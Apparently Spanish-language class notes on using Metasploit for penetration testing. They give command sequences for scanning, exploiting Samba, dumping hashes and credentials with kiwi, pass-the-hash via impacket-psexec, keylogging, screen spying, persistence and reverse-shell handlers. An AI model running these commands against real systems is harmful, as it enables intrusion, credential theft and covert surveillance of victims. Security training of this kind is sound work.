# Metasploit 

Tags: #Comandos #Metasploit #Payloads #Msfvenom #PassTheHash #Psexec

**Metasploit** es una plataforma de pruebas de penetración (Penetration Testing Framework) que se utiliza para realizar pruebas de seguridad en sistemas y aplicaciones. Esta plataforma es ampliamente utilizada por investigadores de seguridad, pentesters y profesionales de la seguridad para descubrir vulnerabilidades y realizar pruebas de explotación de vulnerabilidades. Metasploit se basa en un conjunto de herramientas de seguridad que incluyen un framework de desarrollo de exploits, un motor de base de datos de vulnerabilidades y una colección de módulos de explotación de vulnerabilidades.

En términos prácticos, Metasploit se utiliza para probar la seguridad de un sistema o aplicación mediante la realización de pruebas de penetración, con el objetivo de identificar y explotar vulnerabilidades de seguridad. Para hacer esto, Metasploit proporciona una gran cantidad de exploits, payloads y módulos de post-explotación, que pueden ser utilizados por los profesionales de seguridad para identificar vulnerabilidades y explotarlas. Al utilizar Metasploit, los profesionales de la seguridad pueden simular ataques reales y descubrir vulnerabilidades en sistemas y aplicaciones antes de que los atacantes malintencionados puedan hacerlo, lo que les permite corregir las vulnerabilidades y mejorar la seguridad de sus sistemas.

En esta clase, veremos cómo utilizar algunas de las funcionalidades de esta herramienta.


## Metasploit 

Verificar la DB del Metasploit y después entrar (Cuando se ejecuta por primera vez)
```bash 
❯ msfdb run
```

Ejecutar Metasploit
```bash 
❯ msfconsole -q              # q = Quitar el banner de inicio
```

Gestionar de forma mas organizada la información que vayamos recopilando. 
```bash 
❯ workspace             # Miramos los espacios de trabajo 
❯ workspace -a omar     # Creamos nuestro espacio de trabajo con el nombre 'omar'
❯ workspace default     # Cambiamos al espacio de trabajo llamado 'default', asi podemos ir cambiando de espacios de trabajo
```

```bash
❯ search ❮exploit❯                 # Buscamos el exploit
		# Modulos: 'Auxiliary, Exploits, Post, Payload'
		# Tipo de Accion: 'Dos, Fuzzers, Scanner, Gather'

❯ search platform:"windows"        # Buscar por el SO Windows  
❯ search platform:"linux"          # Buscar por el SO Linux 

❯ search platform:"windows" type:"exploit"       # Buscar exploits en Windows
❯ search platform:"windows" type:"encoder"       # Buscar encoder en Windows
```

Aplicas un reconocimiento en la red local con ARP 
```bash 
❯ use auxiliary/scanner/discovery/arp_sweep      # Para usar el exploit
❯ options                                        # Miramos las opciones del exploit y ver lo que es necesario cargar para hacer el barrido en la subred
❯ info 'o' info -d                               # Nos da una breve descripcion de lo que hace el exploit
❯ set RHOSTS 192.168.68.0/24                     # Colocamos la subred en donde queremos hacer el barrido del ARP
❯ run
❯ hosts                                          # Nos muestra los hosts que ha descubierto en el reconocimiento
❯ services                                       # Nos muestra los servicios, pero para que sea mas efectivo, debemos de pasarle el archivo XML de Nmap
```

En MetaSploit puedes importar archivos XML, el cual puedes obtener del escaneo con Nmap. 
```bash 
❯ db_import /home/omar/Documents/allports        # Importas a Metasploit un archivo XML llamado 'allPorts' colocando su ruta absoluta
```

```bash 
❯ use ❮Number or path❯       # Colocamos el numero del exploit que vamos a usar
❯ options                    # Miramos las opciones del exploit y lo que debemos de configurar
❯ show advanced options      # Miramos las opciones avanzadas del exploit y lo que debemos de configurar
❯ check                      # Nos dice si el RHOST es vulnerable a ese exploit sin explotarlo, esto depende del modulo, si trae esta opcion o no
❯ set LHOST ❮IP❯             # Configuramos el IP local eth0, ens33 (Si estamos en una VPN colocar el Tun0)
❯ set RHOSTS ❮IP❯            # Configuramos el IP remoto (maquina victima)
❯ set RPORT ❮Port❯           # Configuramos el puerto remoto (maquina victima)
❯ set LPORT ❮Port❯           # Configuramos el puerto local
❯ show targets               # Miras los targets disponibles (Diferentes versiones de Windows)
❯ set target ❮Number❯        # Seleccionamos el numero de target a usar
❯ show payloads              # Miramos los payload disponibles
❯ set payload ❮Path❯         # Colocamos la ruta del Payload a usar
❯ run                        # Ejecutamos el exploit  
```

Dentro de la maquina podemos hacer algunos comandos específicos
```bash 
❯ shell                      # Nos carga una shell
❯ load powershell            # Cargamos el modulo powershell
❯ powershell_shell           # Nos carga una powershell 
❯ getuid                     # Nos muestra el nombre del servidor o usuario en Windows  
❯ sysinfo                    # Nos muestra algunos detalles del servidor, arquitectura, SO, etc...
❯ ps                         # Mirar los procesos existentes
❯ hashdump                   # Para dumpear los hashes del sistema, crackearlos y hacer pass-the-hash
❯ load kiwi                  # Cargamos el modulo kiwi para poder usar 'creds_all'
❯ creds_all                  # Recopila informacion de credenciales de todo tipo
```

Usar Psexec
```bash 
❯ impacket-psexec WORKGROUP/omar@<IP Victima> -hashes :3ebi487y598ongyn98g56yng389yr6d6u  # Podemos hacer pass the hash y ser nt authority\system
❯ impacket-psexec WORKGROUP/omar:<Password>@<IP Victima>                                  # Podemos usar la passwd para entrar y ser nt authority\system
```

Comandos de Metasploit dentro de la maquina victima 
```bash 
❯ help                       # Miramos el panel de ayuda
❯ screenshot                 # Captura de pantalla del equipo
❯ load espia                 # Cargamos el modulo 'espia' y asi poder usar el 'screengrab, screenshare'
❯ screenshare                # Mirar el escritorio del usuario remoto en tiempo real 
❯ uictl disable <mouse>      # Podemos desabilitar (disable, enable) algunos componentes de interface de la maquina victima como: mouse, keyboard, all 
❯ keyscan_start              # Sniffer de pulsaciones del teclado
❯ keyscan_dump               # Nos muestra lo que capturo por el teclado con el comando anterior
❯ keyscan_stop               # Para el sniffer de pulsaciones del teclado
❯ background                 # Ponemos la sesion en segundo plano 
❯ sessions                   # Miramos las sesiones activas en segundo plano 
❯ sessions <id>              # Migras a alguna sesion que tenemos en segundo plano
```

Persistencia = Ganar acceso a la maquina victima cada cierto tiempo por si se pierde una conexión 
```bash 
❯ search persistence                                     # Miramos todos los modulos de persistencia
❯ search persistence platform:"windows"                  # Miramos los modulos de persistencia para Windows

❯ use exploit/windows/local/persistence_service          # Usamos un modulo de persistencia
❯ show options                                           # Este modulo nos pide una sesion ya establecida con la maquina victima
❯ set SESSION <id session>                               # Colocamos el id de la sesion que ya tenemos establecida anteriormente
❯ run 
```

Configuración del 'Listener' para las sesiones de persistencia 
```bash 
❯ use exploit/multi/handler                              # Usaremos el exploit
❯ show options 
❯ set payload windows/meterpreter/reverse_tcp            # Configuramos un payload dedicado a Windows 
❯ set LHOST <IP Atacante>                                # Configuramos nuestra IP
❯ run
```


Los dos tipos de payloads utilizados en ataques informáticos: **Staged** y **Non-Staged**.

-   **Payload Staged**: Es un tipo de payload que se **divide en dos** **o más etapas**. La primera etapa es una pequeña parte del código que se envía al objetivo, cuyo propósito es establecer una conexión segura entre el atacante y la máquina objetivo. Una vez que se establece la conexión, el atacante envía la segunda etapa del payload, que es la carga útil real del ataque. Este enfoque permite a los atacantes sortear medidas de seguridad adicionales, ya que la carga útil real no se envía hasta que se establece una conexión segura.
-   **Payload Non-Staged**: Es un tipo de payload que se envía como **una sola entidad** y **no se divide en múltiples etapas**. La carga útil completa se envía al objetivo en un solo paquete y se ejecuta inmediatamente después de ser recibida. Este enfoque es más simple que el Payload Staged, pero también es más fácil de detectar por los sistemas de seguridad, ya que se envía todo el código malicioso de una sola vez.

Es importante tener en cuenta que el tipo de payload utilizado en un ataque dependerá del objetivo y de las medidas de seguridad implementadas. En general, los payloads Staged son más difíciles de detectar y son preferidos por los atacantes, mientras que los payloads Non-Staged son más fáciles de implementar pero también son más fáciles de detectar.

Tipos de Payloads
```bash
Non-Stage               # Sends exploit shellcode all at once. Larger in size ando won't always work -> **windows/meterpreter_reverse_tcp**
Staged                  # Sends payload in stages. Can be less stable -> **windows/meterpreter/reverse_tcp**
```

## Puerto 445 'Reconocimiento'

```bash 
# Miramos la version del SMB
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb                                  # Buscamos el exploit
	❯ use auxiliary/scanner/smb/smb_version       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para saber si soporta SMB2
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb2              # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los usuarios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumusers     # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los directorios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumshares    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                               # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ set VERBOSE false
	❯ run 

	❯ set smbuser <user>                                # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando

# Diccionarios 
/usr/share/wordlists/metasploit/unix_passwords.txt
```

## Puerto 445 'Exploit'

```bash 
# Algunas versiones con exploit (3.0.20)
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search samba 
	❯ use exploit/multi/samba/usermap_script       # Usamos el exploit
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set LHOSTS 192.168.1.157                     # Colocamos la IP de nuestra maquina 
	❯ run 
	❯ shell 
```